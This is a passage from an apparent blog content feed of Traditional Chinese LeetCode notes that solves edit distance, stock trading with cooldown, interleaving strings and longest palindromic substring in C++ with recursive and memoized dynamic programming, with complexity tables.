href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n = word1.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> m = word2.<span class="built_in">length</span>();</span><br><span class="line">        </span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m;j++) dp[n][j] = m -j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n;i++) dp[i][m] = n -i;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=m<span class="number">-1</span>; j&gt;=<span class="number">0</span>; j--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i] == word2[j])&#123;</span><br><span class="line">                    dp[i][j] = dp[i+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(<span class="built_in">min</span>(dp[i+<span class="number">1</span>][j], dp[i][j+<span class="number">1</span>]), dp[i+<span class="number">1</span>][j+<span class="number">1</span>]) +<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡一樣宣告一個用於儲存步驟數<code>(n+1) x (m+1)</code> 大小的二維陣列  <code>dp</code>，首先填滿陣列的最後一行跟最後一列分別代表如果 <code>word1</code> 或 <code>word2</code> 為空，則步驟數為另一方的字串長度。接著就是透過迴圈從陣列最左下角的 base case 往回開始填數字，如果 <code>word1[i] == word2[j]</code> 則比較下一組，否則考慮三種操作中，步驟數最小的操作，並且加上1，就會是當前 <code>dp[i][j]</code> 中需要保存的步驟數，一路迭代回 <code>dp[0][0]</code> 就會是答案。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/72/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>複雜度</th><th>值</th><th>分析</th></tr></thead><tbody><tr><td>時間複雜度</td><td>$O(n \times m)$</td><td>雙重迴圈遍歷大小為 <code>(n+1) x (m+1)</code> 的二維陣列，其中 <code>n</code> 和 <code>m</code> 分別是 <code>word1</code> 和 <code>word2</code> 的長度。這導致最壞情況下需要 <code>O(n * m)</code> 次操作</td></tr><tr><td>空間複雜度</td><td>$O(n \times m)$</td><td>這個解法使用了一個大小為 <code>(n+1) x (m+1)</code> 的二維向量 <code>dp</code>，因此需要 <code>O(n * m)</code> 的空間。此外，除了陣列本身，沒有額外的輔助空間需求</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最佳股票買賣時機含冷凍期 | Medium | LeetCode#309. Best Time to Buy and Sell Stock with Cooldown</title>
      <link href="/posts/c95a58c1.html"/>
      <url>/posts/c95a58c1.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://leozzmc.github.io/posts/a0e35335.html">121. Best Time to Buy and Sell Stock</a><br><a href="https://leozzmc.github.io/posts/fcfb0850.html">122. Best Time to Buy and Sell Stock II</a><br><a href="https://leozzmc.github.io/posts/cfc810b0.html">123. Best Time to Buy and Sell Stock III</a><br><a href="https://leozzmc.github.io/posts/96bf11ff.html">188. Best Time to Buy and Sell Stock IV</a></p><h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/309/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一個整數陣列 <code>prices</code>，其中 <code>prices[i]</code> 代表給定股票在第 <code>i</code> 天的價格，請找到你能獲得的最高股票收益，可以買賣股票多次，但是有以下限制：<ul><li><strong>當你賣出股票後，隔一天為冷卻期，無法進行買賣</strong></li><li>在你買股票前，需要把先前持有的股票賣出 (i.e. 你不能夠 第一天買然後第二天也買，要先把第一天的賣掉)</li></ul></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題我後來參考了 <a href="https://www.youtube.com/watch?v=I7j0F7AHpb8&t=669s">NeetCode 的影片</a>，裡面的樹狀圖幫助很大，</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Decision Tree </summary><div class="toggle-content"><p><img src="/img/LeetCode/309/tree.png"></p></div></details><h2 id="Recursive-Memoization"><a href="#Recursive-Memoization" class="headerlink" title="Recursive + Memoization"></a>Recursive + Memoization</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices, <span class="type">int</span> start, <span class="type">int</span> canBuy)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start &gt;= prices.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(dp[start][canBuy]!= <span class="number">-1</span>) <span class="keyword">return</span> dp[start][canBuy];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Not buy</span></span><br><span class="line">        <span class="type">int</span> cooldown = <span class="built_in">helper</span>(prices,start+<span class="number">1</span>, canBuy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Buy</span></span><br><span class="line">        <span class="keyword">if</span>(canBuy == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="type">int</span> sum = -prices[start] + <span class="built_in">helper</span>(prices,start+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">            dp[start][canBuy] = <span class="built_in">max</span>(cooldown, sum);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// Sell</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(canBuy == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> sum = prices[start]+<span class="built_in">helper</span>(prices,start+<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line">            dp[start][canBuy] = <span class="built_in">max</span>(cooldown, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[start][canBuy];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices.<span class="built_in">size</span>()&lt;=<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(prices.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>, <span class="number">-1</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(prices,<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>首先一樣狀況分成三種，cooldown, buy, sell。如果還沒有買，那當天可以選擇買或冷卻，如果當天買了，那當天可以選擇賣或冷卻。</strong> 在 <code>helper</code> 函數中，透過 <code>canBuy</code> 來判斷當天是否可以買，如果可以買那就會是 <code>1</code> 否則就賣出，也就是為 <code>0</code>。由於每天都可以選擇 cooldown 因此在一開始就先 cooldown 然後直接呼叫隔天。回傳結果存放到變數 <code>cooldown</code>當中，而如果當天可以買，則當前總額 <code>sum</code> 會需要扣掉當日價格，也可以看成加上負的當日價格，再加上做這個決定後，後續的遞迴迴呼叫結果 <code>helper(prices, start+1, 0)</code> (參數 <code>0</code> 是因為今天買了，那明天就不能買)。 **接著就需要比較，第一天冷卻還是第一天買入的結果值比較大， <code>max(cooldown, sum)</code>**，這個值會存放到用於儲存重複計算的 <code>dp[start][canBuy]</code> 中。</p><p>另一方面，如果當日要賣出，則需要將當日價格加上，這個決定後續的遞迴結果 <code>helper(prices, start+2, 1)</code>，接著一樣與今日冷卻的決策結果 <code>cooldown</code> 去做比較 <code>max(cooldown, sum)</code> 並一樣儲存在 <code>dp[start][canBuy]</code> 當中。 最後回傳 <code>dp[start][canBuy]</code>。</p><p>遞迴終止條件，如果超出目前 <code>prices</code> 長度範圍，則回傳 <code>0</code>，另外若有發現重複計算，則回傳計算過的值 <code>dp[start][canBuy]</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/309/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>複雜度</th><th>結果</th><th>說明</th></tr></thead><tbody><tr><td>時間複雜度</td><td>$O(n)$</td><td><code>dp</code> 包含 $n \cdot 2$ 種狀態，其中 $n$ 是價格陣列的大小，每個狀態最多計算一次（使用遞迴函數時會檢查 <code>dp[start][canBuy]</code> 是否已計算），操作僅需常數時間</td></tr><tr><td>空間複雜度</td><td>$O(n)$</td><td><code>dp</code> 占用 $O(n)$ 空間，儲存每種狀態的結果。遞迴過程中，每次調用函數會使用額外的遞迴棧空間，最深遞迴深度為 $n$，總空間複雜度為 $O(n)$</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交錯字串 | Medium | LeetCode#97. Interleaving String</title>
      <link href="/posts/84d0f7e8.html"/>
      <url>/posts/84d0f7e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/97/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目敘述：給定字串 <code>s1</code>, <code>s2</code>, <code>s3</code>，檢查 <code>s3</code> 是否是由 <code>s1</code> 以及 <code>s2</code>  <strong>交錯組合而成 (Interleaving)。</strong></li></ul><div class="note info flat"><p><code>s = s1 + s2 + s3 +... + sn</code><br><code>t = t1 + t2 + t3 + ... + tn</code><br><code>|n-m| &lt;= 1</code><br>Interleaving: <code>s1+t1+s2+t2+s3+t3+...</code> or <code>t1+s1+t2+s2+t3+s3+...</code></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">helper</span><span class="params">(string s3,string s1, string s2, string temp, <span class="type">int</span> start)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start &gt; s3.<span class="built_in">length</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(start == s3.<span class="built_in">length</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;=s3.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s1[i] == s3[i])&#123;</span><br><span class="line">            temp += s1[i];</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">helper</span>(s3, s1, s2, temp, start+<span class="number">1</span>)) <span class="keyword">continue</span>;</span><br><span class="line">            temp.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s2[i] == s3[i])&#123;</span><br><span class="line">            temp += s2[i];</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">helper</span>(s3, s1, s2, temp, start+<span class="number">1</span>)) <span class="keyword">continue</span>;</span><br><span class="line">            temp.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isInterleave</span><span class="params">(string s1, string s2, string s3)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">helper</span>(s1,s2,s3,<span class="string">&quot;&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這樣的解法，對於相同的 <code>start</code>，會重複計算大量子問題。因此會超時！</p><h2 id="Recursive-Memoization"><a href="#Recursive-Memoization" class="headerlink" title="Recursive + Memoization"></a>Recursive + Memoization</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">helper</span><span class="params">(string s3,string s1, string s2, <span class="type">int</span> i, <span class="type">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i+j == s3.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[i][j]!= <span class="number">-1</span>) <span class="keyword">return</span> dp[i][j];</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> result =<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;s3.<span class="built_in">length</span>() &amp;&amp; s1[i] == s3[i+j])&#123;</span><br><span class="line">            result = <span class="built_in">helper</span>(s3, s1, s2, i+<span class="number">1</span>, j);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span>(!result &amp;&amp; j&lt;s3.<span class="built_in">length</span>() &amp;&amp; s2[j] == s3[i+j])&#123;</span><br><span class="line">            result = <span class="built_in">helper</span>(s3, s1, s2, i, j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[i][j]=result;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isInterleave</span><span class="params">(string s1, string s2, string s3)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s3.<span class="built_in">length</span>()!=s1.<span class="built_in">length</span>()+s2.<span class="built_in">length</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> n= s1.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> m = s2.<span class="built_in">length</span>();</span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m+<span class="number">1</span>, <span class="number">-1</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(s3,s1,s2,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡宣告了用於儲存重複計算結果的 2D陣列，<code>vector&lt;vector&lt;int&gt;&gt; dp</code>，在 <code>isInterleave</code> 函數中初始化為 <code>(n+1) x (m+1)</code>，<code>helper</code> 函數中改成不以 <code>for</code> 去做迭代，而是用用遞迴的方式在每一層檢查交錯，另外在先前得解法中沒有考慮到的是， <strong><code>s3</code> 的長度會是 <code>s1</code> 跟 <code>s2</code> 的長度加總，因此不能用 <code>s1[i]==s3[i]</code> 的方式去迭代</strong> ，這樣會超出 <code>s1</code> 的長度限制。因此我們透過 <code>s1[i] == s3[i+j]</code> 來檢查交錯，<strong>如果相等，那就按照當前的 <code>s1</code>的位置繼續遞迴檢查下去 <code>helper(s3,s1,s2, i+1,j)</code> 並且將結果保存到 <code>result</code></strong> ，如果在當前這層，<code>result</code> 結果為 <code>false</code> 則改成檢查 <code>s2</code>，如果 <code>s2[j] == s3[i+j]</code> 則可以接續當前 <code>s2</code>的位置繼續遞迴檢查 <code>helper(s3,s1,s2,i,j+1)</code>，結果一樣保存到 <code>result</code>。</p><p>為了應對大量重複計算，在每一層遞迴季算中，都會將結果的 <code>result</code> 保存到對應的 <code>dp[i][j]</code> 代表以該位置<code>i,j</code>切割 <code>s1</code>, <code>s2</code> 是否能夠交錯組合成 <code>s3</code>。若有重複的計算結果也直接回傳 <code>dp[i][j]</code>，以減省時間。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/97/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th><strong>複雜度類型</strong></th><th><strong>時間&#x2F;空間複雜度</strong></th><th><strong>分析過程</strong></th></tr></thead><tbody><tr><td><strong>時間複雜度</strong></td><td>$O(n * m)$</td><td>遞迴檢查每個狀態，且使用 <code>dp</code> 陣列避免重複計算，共有 <code>n * m</code> 狀態需要計算</td></tr><tr><td><strong>空間複雜度</strong></td><td>$O(n * m)$</td><td>需要一個大小為 <code>n * m</code> 的二維 <code>dp</code> 陣列來儲存每個狀態結果，遞迴堆疊使用額外空間 $O(d)$</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最長迴文子字串 | Medium | LeetCode#5. Longest Palindromic Substring</title>
      <link href="/posts/bf0dee7b.html"/>
      <url>/posts/bf0dee7b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/5/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述：給定一個字串 <code>s</code>，求出其最長的迴文子字串</li></ul><div class="note info flat"><p><code>babadsscca</code> 最長回文子字串會是 <code>bab</code> 或 <code>aba</code></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始想法一樣比較暴力，一樣會是想先找出遞迴關係式，首先應該會分成兩個函數處理，一個負責遞迴的邏輯，另一個用於確認是否為回文，遞迴邏輯會先透過迴圈來去切出不同範圍的子字串，子字串丟到函數檢查是否為回文，如果是那就檢查是否是最長的子字串，如果是，那就丟給原本的函數遞迴檢查下去</p><h2 id="Recursive"><a href="#Recursive" class="headerlink" title="Recursive"></a>Recursive</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkPalindrome</span><span class="params">(string subStr)</span></span>&#123;</span><br><span class="line">        string tempStr = subStr;</span><br><span class="line">        <span class="built_in">reverse</span>(tempStr.<span class="built_in">begin</span>(), tempStr.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">if</span>(tempStr == subStr) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">helper</span><span class="params">(string s, string subStr, <span class="type">int</span> start, string maxStr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start == s.<span class="built_in">length</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> maxStr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            subStr += s[i];</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">checkPalindrome</span>(subStr))&#123;</span><br><span class="line">                <span class="keyword">if</span>(subStr.<span class="built_in">length</span>() &gt; maxStr.<span class="built_in">length</span>() )&#123;</span><br><span class="line">                    maxStr = subStr;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(s, <span class="string">&quot;&quot;</span>,start+<span class="number">1</span>, maxStr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(s, <span class="string">&quot;&quot;</span>, <span class="number">0</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>但這樣會進行大量重複的比較是否為回文的計算，因此會 Time Limited Excceded!</p></blockquote><h2 id="Iteration-Memoization"><a href="#Iteration-Memoization" class="headerlink" title="Iteration + Memoization"></a>Iteration + Memoization</h2><p>這裡我直接改成用 Iteration的方式來進行最佳化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkPalindrome</span><span class="params">(<span class="type">const</span> string &amp;s, <span class="type">int</span> left, <span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[left][right]!= <span class="number">-1</span>) <span class="keyword">return</span> dp[left][right]; </span><br><span class="line">        <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[left] != s[right])&#123;</span><br><span class="line">                dp[left][right] = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">return</span> dp[left][right];</span><br><span class="line">            &#125; </span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[left][right] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> dp[left][right];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n,<span class="number">-1</span>));</span><br><span class="line">        string maxStr=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> start=<span class="number">0</span>; start&lt; n; start++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> end= start; end &lt; n; end++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">checkPalindrome</span>(s, start, end))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(end-start+<span class="number">1</span> &gt; maxStr.<span class="built_in">length</span>())&#123;</span><br><span class="line">                        maxStr = s.<span class="built_in">substr</span>(start, end-start+<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先宣告一個二維陣列 <code>dp</code> 用於儲存是否為回文的判斷結果，另外在 <code>checkPalindrome</code> 